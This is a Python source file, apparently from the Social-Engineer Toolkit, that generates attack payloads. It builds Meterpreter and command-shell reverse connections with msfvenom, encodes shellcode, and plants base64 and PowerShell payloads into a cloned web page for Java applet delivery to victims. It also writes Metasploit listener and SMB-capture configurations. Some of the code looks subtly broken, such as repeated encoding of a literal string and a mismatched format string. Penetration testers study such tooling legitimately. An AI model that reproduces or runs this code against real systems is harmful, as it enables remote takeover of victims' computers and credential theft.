import subprocess
import time
import sys
import os
import re
import socket
import base64
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *
try:
    if len(check_options("IPADDR=")) > 2:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = ""
except:
    ipaddr = ""
me = mod_name()
listener = "notdefined"
definepath = os.getcwd()
sys.path.append(definepath)
port1 = "8080"
port2 = "8081"
operating_system = check_os()
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off":
    stage_encoding = "false"
else:
    stage_encoding = "true"
configfile = open("/etc/setoolkit/set.config", "r").readlines()
msf_path = meta_path()
auto_migrate = check_config("AUTO_MIGRATE=")
meterpreter_multi = check_config("METERPRETER_MULTI_SCRIPT=")
linux_meterpreter_multi = check_config("LINUX_METERPRETER_MULTI_SCRIPT=")
meterpreter_multi_command = check_config("METERPRETER_MULTI_COMMANDS=")
meterpreter_multi_command = meterpreter_multi_command.replace(";", "\n")
linux_meterpreter_multi_command = check_config("LINUX_METERPRETER_MULTI_COMMANDS=")
linux_meterpreter_multi_command = linux_meterpreter_multi_command.replace(";", "\n")
unc_embed = check_config("UNC_EMBED=")
attack_vector = 0
linosx = 0
multiattack = ""
if os.path.isfile(userconfigpath + "attack_vector"):
    fileopen = open(userconfigpath + "attack_vector", "r")
    for line in fileopen:
        line = line.rstrip()
        if line == "java":
            attack_vector = "java"
        if line == "multiattack":
            attack_vector = "multiattack"
            multiattack = open(userconfigpath + "multi_payload", "w")
multiattack_java = "off"
if os.path.isfile(userconfigpath + "multi_java"):
    multiattack_java = "on"
payloadgen = "regular"
if os.path.isfile(userconfigpath + "payloadgen"):
    payloadgen = "solo"
if check_options("IPADDR=") == False:
    fileopen = open("/etc/setoolkit/set.config", "r")
    data = fileopen.read()
    match = re.search("AUTO_DETECT=ON", data)
    if match:
        try:
            ipaddr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ipaddr.connect(('google.com', 0))
            ipaddr.settimeout(2)
            ipaddr = ipaddr.getsockname()[0]
            update_options("IPADDR=" + ipaddr)
        except Exception as e:
            log(e)
            ipaddr = raw_input(
                setprompt(["4"], "IP address for the payload listener (LHOST)"))
            update_options("IPADDR=" + ipaddr)
    match = re.search("AUTO_DETECT=OFF", data)
    if match:
        ipaddr = raw_input(
            setprompt(["4"], "Enter the IP address for the payload (reverse)"))
        update_options("IPADDR=" + ipaddr)
try:
    path = msf_path
    encode = ""
    choice1 = ""
    choice3 = ""
    if os.path.isfile(userconfigpath + "meterpreter_reverse_tcp_exe"):
        fileopen = open(userconfigpath + "meterpreter_reverse_tcp_exe", "r")
        for line in fileopen:
            choice3 = line.rstrip()
            attack_vector = ""
        choice1 = "windows/meterpreter/reverse_tcp"
        encode = "16"
    if choice1 == "":
        debug_msg(me, "printing 'text.payload_menu_1'", 5)
        show_payload_menu1 = create_menu(payload_menu_1_text, payload_menu_1)
        choice1 = raw_input(setprompt(["4"], ""))
        if choice1 == "":
            choice1 = "1"
    if choice1 != "":
        choice1 = check_length(choice1, 8)
        choice1 = str(choice1)
    custom = 0
    counter = 0
    flag = 0
    encode_stop = 0
    if choice1 == "exit":
        exit_set()
    if choice1 == '':
        choice1 = ("1")
    if choice1 == '5' or choice1 == '6' or choice1 == '7':
        encode_stop = 1
        encode = ""
    if choice1 == '7':
        flag = 1
    if choice1 == '1' or choice1 == '2' or choice1 == '6' or choice1 == '8':
        encode_stop = 1
        encode = 0
    if choice1 == '3' or choice1 == '4' or choice1 == "5":
        encoder = 'false'
        payloadgen = 'solo'
        encode_stop = 1
        filewrite = open(userconfigpath + "set.payload", "w")
        if choice1 == '3':
            filewrite.write("SETSHELL")
        if choice1 == '4':
            filewrite.write("SETSHELL_HTTP")
        if choice1 == '5':
            filewrite.write("RATTE")
        filewrite.close()
    if choice1 != "7":
        choice1 = ms_payload_2(choice1)
    if counter == 0:
        courtesyshell = ("")
    if choice1 == '7':
        print_info("Example: /root/custom.exe")
        choice1 = raw_input(setprompt(["4"], "Enter the path to your executable"))
        if not os.path.isfile(choice1):
            while 1:
                print_error("ERROR:File not found. Try Again.")
                choice1 = raw_input(setprompt(["4"], "Enter the path to your executable"))
                if os.path.isfile(choice1): break
        update_options("CUSTOM_EXE=%s" % (choice1))
        custom = 1
    if custom == 1:
        check_write = open(userconfigpath + "custom.exe", "w")
        check_write.write("VALID")
        check_write.close()
        shutil.copyfile("%s" % (choice1), "msf.exe")
        shutil.copyfile("msf.exe", userconfigpath + "msf.exe")
    encoder = "false"
    if choice1 == "cmd/multi": update_options("CUSTOM_EXE=CMD/MULTI")
    if choice1 != "set/reverse_shell":
        if os.path.isfile(userconfigpath + "web_clone/index.html"):
            fileopen = open(userconfigpath + "web_clone/index.html", "r")
            data = fileopen.read()
            data = data.replace("freehugs", "")
            os.remove(userconfigpath + "web_clone/index.html")
            filewrite = open(userconfigpath + "web_clone/index.html", "w")
            filewrite.write(data)
            filewrite.close()
        if check_options("IPADDR=") == 0:
            choice2 = raw_input(setprompt(
                ["4"], "IP Address of the listener/attacker (reverse) or host/victim (bind shell)"))
            update_options("IPADDR=" + choice2)
        choice2 = check_options("IPADDR=")
        if choice3 == "":
            if choice1 != "shellcode/multipyinject":
                if choice1 != "cmd/multi":
                    if custom == 0:
                        choice3 = raw_input(setprompt(["4"], "PORT of the listener [443]"))
        if choice3 == "80":
            print_warning(
                "WARNING: SET Web Server requires port 80 to listen.")
            print_warning(
                "WARNING: Are you sure you want to proceed with port 80?")
            port_choice_option = raw_input(
                "\nDo you want to keep port 80? [y/n]")
            if port_choice_option == "n":
                choice3 = raw_input(setprompt(["4"], "PORT of listener [443]"))
        if choice3 == '':
            choice3 = '443'
        update_options("PORT=" + choice3)
        if choice1 == "set/reverse_shell":
            encoder = "false"
            filewrite = open(userconfigpath + "set.payload.posix", "w")
            filewrite.write("true")
            filewrite.close()
            import src.core.payloadprep
        if attack_vector == "multiattack":
            multiattack.write("MAIN=" + str(choice3) + "\n")
            multiattack.write("MAINPAYLOAD=" + str(choice1) + "\n")
        if encoder == "true":
            choice4 = ("raw")
            msf_filename = ("1msf.exe")
        if encoder == "false":
            choice4 = ("exe")
            msf_filename = ("msf.exe")
        if flag == 0:
            portnum = "LPORT=" + choice3
        if flag == 1:
            portnum = ""
        if encode != "BACKDOOR":
            if choice1 != "set/reverse_shell":
                if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
                        print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n")
                        choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_https]"))
                        if choice9 == "":
                            choice9 = "windows/meterpreter/reverse_https"
                        if choice9 == "1":
                            choice9 = "windows/meterpreter/reverse_tcp"
                        if choice9 == "2":
                            choice9 = "windows/meterpreter/reverse_https"
                        if choice9 == "3":
                            choice9 = "windows/meterpreter/reverse_http"
                        if choice9 == "4":
                            choice9 = "windows/meterpreter/reverse_tcp_allports"
                        if ipaddr == "":
                            ipaddr = check_options("IPADDR=")
                    if choice1 == "shellcode/alphanum":
                        print_status("Generating the payload via msfvenom and generating alphanumeric shellcode...")
                        subprocess.Popen("%smsfvenom -p %s LHOST=%s %s StagerURILength=5 StagerVerifySSLCert=false -e EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (meta_path(), choice9, choice2, portnum, userconfigpath), shell=True).wait()
                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject" or choice1 == "cmd/multi":
                        update_options("PYINJECTION=ON")
                        multipyinject_payload = ""
                        if os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
                            os.remove("%s/meta_config_multipyinjector" % (userconfigpath))
                        if os.path.isfile(userconfigpath + "payload.options.shellcode"):
                            os.remove(userconfigpath + "payload_options.shellcode")
                        if choice1 != "cmd/multi": payload_options = open(userconfigpath + "payload_options.shellcode", "a")
                        while 1:
                            if choice1 == "cmd/multi": break
                            if choice1 == "shellcode/multipyinject":
                                print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                choice9 = raw_input(
                                    setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                                if choice9 == "" or choice9 == "1":
                                    choice9 = "windows/meterpreter/reverse_tcp"
                                if choice9 == "2":
                                    choice9 = "windows/meterpreter/reverse_https"
                                if choice9 == "3":
                                    choice9 = "windows/meterpreter/reverse_http"
                                if choice9 == "4":
                                    choice9 = "windows/meterpreter/reverse_tcp_allports"
                                if choice9 == "5":
                                    choice9 = "windows/shell/reverse_tcp"
                                if ipaddr == "":
                                    ipaddr = check_options("IPADDR=")
                                if choice9 == "6":
                                    break
                                shellcode_port = raw_input(setprompt(["4"], "Enter the port number [443]"))
                                if shellcode_port == "": shellcode_port = "443"
                                filewrite = open("%s/meta_config_multipyinjector" % (userconfigpath), "a")
                                port_check = check_ports("%s/meta_config_multipyinjector" % (userconfigpath), shellcode_port)
                                if port_check == False:
                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (choice9, stage_encoding, ipaddr, shellcode_port))
                                    filewrite.close()
                            if choice1 != "cmd/multi":
                                if validate_ip(choice2) == False:
                                    if choice9 != "windows/meterpreter/reverse_https":
                                        if choice9 != "windows/meterpreter/reverse_http":
                                            print_status("Possible hostname detected, switching to windows/meterpreter/reverse_https")
                                            choice9 == "windows/meterpreter/reverse_https"
                                if choice9 == "windows/meterpreter/reverse_tcp_allports":
                                    portnum = "LPORT=1"
                                if "multipyinject" in choice1:
                                    portnum = shellcode_port
                                else:
                                    portnum = portnum.replace("LPORT=", "")
                                if choice9 == "windows/meterpreter/reverse_tcp":
                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
                                if choice9 == "windows/meterpreter/reverse_https":
                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
                                if choice9 == "windows/meterpreter/reverse_http":
                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
                                if choice9 == "windows/meterpreter/reverse_tcp_allports":
                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
                                if choice9 == "windows/shell/reverse_tcp":
                                    shellcode = metasploit_shellcode(choice9, choice2, portnum)
                                if choice1 == "shellcode/pyinject":
                                    shellcode_port = portnum.replace("LPORT=", "")
                                if validate_ip(choice2) == True: 
                                    shellcode = shellcode_replace(choice2, shellcode_port, shellcode)
                                payload_options.write(choice9 + " " + portnum + ",")
                                if choice1 == "shellcode/pyinject": break
                                multipyinject_payload += shellcode + ","
                        if choice1 != "cmd/multi":
                            if multipyinject_payload.endswith(","):
                                multipyinject_payload = multipyinject_payload[:-1]
                        if choice1 == "shellcode/multipyinject":
                            print_status("Encrypting the shellcode via AES 256 encryption..")
                            secret = os.urandom(32)
                            shellcode = encryptAES(secret, multipyinject_payload)
                            print_status("Dynamic cipher key created and embedded into payload.")
                        filewrite = open("%s/meterpreter.alpha_decoded" % (userconfigpath), "w")
                        filewrite.write(shellcode)
                        filewrite.close()
                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                        payload_options.close()
                    fileopen = open("%s/meterpreter.alpha_decoded" % (userconfigpath), "r")
                    data = fileopen.read()
                    if payloadgen != "solo":
                        data = str(data)
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                        data = base64.b64encode(b'data')
                    filewrite = open("%s/meterpreter.alpha" % (userconfigpath), "w")
                    filewrite.write(str(data))
                    filewrite.close()
                    if choice1 == "shellcode/alphanum":
                        print_status("Prepping shellcodeexec for delivery..")
                    if choice1 == "shellcode/pyinject":
                        print_status("Prepping pyInjector for delivery..")
                    if choice1 == "shellcode/multipyinject":
                        print_status("Prepping Multi-pyInjector for delivery..")
                    random_string = generate_random_string(3, 3).upper()
                    if choice1 == "shellcode/alphanum":
                        fileopen = open("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb").read()
                    if choice1 == "shellcode/pyinject":
                        fileopen = open("%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb").read()
                    if choice1 == "shellcode/multipyinject":
                        fileopen = open("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb").read()
                    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyiject":
                        filewrite = open(userconfigpath + "msf.exe", "wb")
                        filewrite.write(fileopen)
                        filewrite.close()
                    subprocess.Popen("cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (userconfigpath, userconfigpath), shell=True).wait()
                    if os.path.isfile("%s/web_clone/index.html" % (userconfigpath)):
                        fileopen = open("%s/web_clone/index.html" %(userconfigpath), "r")
                        filewrite = open("%s/web_clone/index.html.new" % (userconfigpath), "w")
                        fileopen2 = open("%s/meterpreter.alpha" % (userconfigpath), "r")
                        alpha_shellcode = fileopen2.read().rstrip()
                        data = fileopen.read()
                        data = data.replace(
                            'param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
                        if choice1 == "shellcode/multipyinject":
                            secret = base64.b64encode(b'secret')
                            data = data.replace('param name="10" value=""', 'param name="10" value ="%s"' % (secret))
                        filewrite.write(str(data))
                        filewrite.close()
                        if choice1 == "shellcode/alphanum":
                            print_status("Prepping website for alphanumeric injection..")
                        if choice1 == "shellcode/pyinject":
                            print_status("Prepping website for pyInjector shellcode injection..")
                        print_status("Base64 encoding shellcode and prepping for delivery..")
                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html 1> /dev/null 2> /dev/null" % (userconfigpath, userconfigpath), shell=True).wait()
                    if choice9 == "windows/meterpreter/reverse_tcp_allports":
                        portnum = "LPORT=1"
                        choice3 = "1"
                        update_options("PORT=1")
                    choice1 = choice9
        filewrite = open(userconfigpath + "metasploit.payload", "w")
        filewrite.write(choice1)
        filewrite.close()
        setshell_counter = 0
        powershell = check_config("POWERSHELL_INJECTION=")
        if powershell.lower() == "on" or powershell.lower() == "yes":
            if choice1 == "set/reverse_shell" or choice1 == "RATTE":
                print_status("Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
                setshell_counter = 1
            if setshell_counter == 0:
                if custom == 0:  # or choice1 != "set/reverse_shell" or choice1 != "shellcode/alphanum":
                    if os.path.isfile("%s/web_clone/index.html" % (userconfigpath)):
                        if choice1 != "cmd/multi":
                            try: core.module_reload(src.payloads.powershell.prep)
                            except: import src.payloads.powershell.prep
                            if os.path.isfile("%s/x86.powershell" % (userconfigpath)):
                                fileopen1 = open("%s/x86.powershell" % (userconfigpath), "r")
                                x86 = fileopen1.read()
                                x86 = "powershell -ec " + x86
                        if choice1 == "cmd/multi":
                            print_status("This section will allow you to specify your own .txt file which can contain one more multiple commands. In order to execute multiple commands you would enter them in for example: cmd1,cmd2,cmd3,cmd4. In the background the Java Applet will enter in cmd /c 'yourcommands here'. You need to provide a path to the txt file that contains all of your commands or payloads split by commas. If just one, then just use no ,.")
                            filepath = raw_input("\nEnter the path to the file that contains commands: ")
                            while 1:
                                if not os.path.isfile(filepath):
                                    filepath = raw_input("[!] File not found.\nEnter the path again and make sure file is there: ")
                                if os.path.isfile(filepath): break
                            x86 = open(filepath, "r").read()
                            print_status("Multi-command payload delivery for Java Applet selected.")
                            print_status("Embedding commands into Java Applet parameters...")
                            print_status("Note that these will be base64-encoded once, regardless of the payload..")
                        fileopen3 = open("%s/web_clone/index.html" % (userconfigpath), "r")
                        filewrite = open("%s/web_clone/index.html.new" % (userconfigpath), "w")
                        data = fileopen3.read()
                        x86 = x86.encode("utf-8")
                        base_encode = base64.b64encode(x86)
                        data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (base_encode))
                        data = data.replace('param name="6" value=""', 'param name="6" value="%s"' % (base_encode))
                        if choice1 == "cmd/multi": data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
                        if choice1 != "cmd/multi":
                            deploy_binaries = check_config("DEPLOY_BINARIES=")
                            if deploy_binaries.lower() == "n" or deploy_binaries.lower() == "no":
                                data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
                            if deploy_binaries.lower() == "y" or deploy_binaries.lower() == "yes":
                                data = data.replace('param name="8" value="NO"', 'param name="8" value="YES"')
                        filewrite.write(data)
                        filewrite.close()
                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (userconfigpath, userconfigpath), stdout=subprocess.PIPE, shell=True).wait()
        if custom == 1 or choice1 == "set/reverse_shell" or choice1 == "shellcode/alphanum" or choice1 == "cmd/multi":
            fileopen3 = fileopen = open("%s/web_clone/index.html" % (userconfigpath), "r")
            filewrite = open("%s/web_clone/index.html.new" % (userconfigpath), "w")
            data = fileopen3.read()
            data = data.replace('param name="8" value="NO"', 'param name="8" value="YES"')
            filewrite.write(data)
            filewrite.close()
            subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        if choice1 == "set/reverse_shell":
            attack_vector = "set_payload"
        if attack_vector == "java" or multiattack_java == "on":
            if attack_vector != "set_payload":
                port1 = check_config("OSX_REVERSE_PORT=")
                if attack_vector == "multiattack":
                    port1 = "8082"
                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
                    if check_config("CUSTOM_LINUX_OSX_PAYLOAD=").lower() == "on":
                        osx_path = raw_input(
                            "Enter the path for the custom OSX payload (blank for nothing): ")
                        lin_path = raw_input(
                            "Enter the path for the custom Linux payload (blank for nothing): ")
                        print_status(
                            "Copying custom payloads into proper directory structure.")
                        if osx_path != "":
                            while 1:
                                if not os.path.isfile(osx_path):
                                    print_error(
                                        "File not found, enter the path again.")
                                    osx_path = raw_input(
                                        "Enter the path for the custom OSX payload (blank for nothing): ")
                                if os.path.isfile(osx_path):
                                    break
                            if osx_path != "":
                                shutil.copyfile(osx_path, userconfigpath + "mac.bin")
                        if lin_path != "":
                            while 1:
                                if not os.path.isfile(lin_path):
                                    print_error(
                                        "File not found, enter the path again.")
                                    lin_path = raw_input(
                                        "Enter the path for the custom Linux payload (blank for nothing): ")
                                if os.path.isfile(lin_path):
                                    break
                            if lin_path != "":
                                shutil.copyfile(lin_path, userconfigpath + "nix.bin")
                    else:
                        port2 = check_config("LINUX_REVERSE_PORT=")
                        osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
                        linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
                        print_status("Generating OSX payloads through Metasploit...")
                        subprocess.Popen(r"msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (meta_path(), osxpayload, choice2, port1, userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                        print_status("Generating Linux payloads through Metasploit...")
                        subprocess.Popen(r"%smsfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/nix.bin" % (meta_path(), linuxpayload, choice2, port2, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                        if multiattack_java == "on":
                            multiattack.write("OSX=" + str(port1) + "\n")
                            multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
                            multiattack.write("LINUX=" + str(port2) + "\n")
                            multiattack.write("LINUXPAYLOAD=%s\n" % (linuxpayload))
                    osxcheck = check_options("MAC.BIN=")
                    linuxcheck = check_options("NIX.BIN=")
                    shutil.copyfile(userconfigpath + "mac.bin", userconfigpath + "web_clone/%s" % (osxcheck))
                    shutil.copyfile(userconfigpath + "nix.bin", userconfigpath + "web_clone/%s" % (linuxcheck))
        try:
            if os.path.isfile("%s/meta_config" % (userconfigpath)):
                filewrite = open("%s/meta_config" % (userconfigpath), "a")
            if not os.path.isfile("%s/meta_config" % (userconfigpath)):
                filewrite = open("%s/meta_config" % (userconfigpath), "w")
            if not os.path.isfile("%s/multi_meta" % (userconfigpath)):
                port_check = check_ports("%s/meta_config" % (userconfigpath), choice3)
                if port_check == False:
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write("set PAYLOAD " + choice1 + "\n")
                    filewrite.write("set LHOST " + ipaddr + "\n")
                    if flag == 0:
                        filewrite.write("set LPORT " + choice3 + "\n")
                    filewrite.write("set EnableStageEncoding %s\n" %
                                    (stage_encoding))
                    filewrite.write("set ExitOnSession false\n")
                    if auto_migrate == "ON":
                        filewrite.write(
                            "set AutoRunScript post/windows/manage/smart_migrate\n")
                    if meterpreter_multi == "ON":
                        multiwrite = open(userconfigpath + "multi_meter.file", "w")
                        multiwrite.write(meterpreter_multi_command)
                        filewrite.write(
                            "set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (userconfigpath))
                        multiwrite.close()
                    filewrite.write("exploit -j\r\n\r\n")
                if unc_embed == "ON":
                    filewrite.write("use server/capture/smb\n")
                    filewrite.write("exploit -j\r\n\r\n")
                if payloadgen == "solo":
                    filewrite.close()
            if payloadgen == "regular":
                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write(
                        "set PAYLOAD osx/x86/shell_reverse_tcp" + "\n")
                    filewrite.write("set LHOST " + choice2 + "\n")
                    filewrite.write("set LPORT " + port1 + "\n")
                    filewrite.write("set ExitOnSession false\n")
                    filewrite.write("exploit -j\r\n\r\n")
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write(
                        "set PAYLOAD linux/x86/shell/reverse_tcp" + "\n")
                    filewrite.write("set LHOST " + choice2 + "\n")
                    filewrite.write("set LPORT " + port2 + "\n")
                    if linux_meterpreter_multi == "ON":
                        multiwrite = open(
                            userconfigpath + "lin_multi_meter.file", "w")
                        multiwrite.write(linux_meterpreter_multi_command)
                        filewrite.write(
                            "set InitialAutorunScript multiscript -rc %s/lin_multi_meter.file\n" % (userconfigpath))
                        multiwrite.close()
                        filewrite.write("set ExitOnSession false\n")
                    filewrite.write("exploit -j\r\n\r\n")
            filewrite.close()
        except Exception as e:
            log(e)
            print_error("ERROR:Something went wrong:")
            print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)
except KeyboardInterrupt:
    print_warning("Keyboard Interrupt Detected, exiting Payload Gen")
if attack_vector == "multiattack":
    multiattack.close()
if os.path.isfile("%s/fileformat.file" % (userconfigpath)):
    filewrite = open("%s/payload.options" % (userconfigpath), "w")
    filewrite.write(choice1 + " " + ipaddr + " " + choice3)
    filewrite.close()
if choice1 == "set/reverse_shell":
    if os.path.isfile(userconfigpath + "meta_config"):
        os.remove(userconfigpath + "meta_config")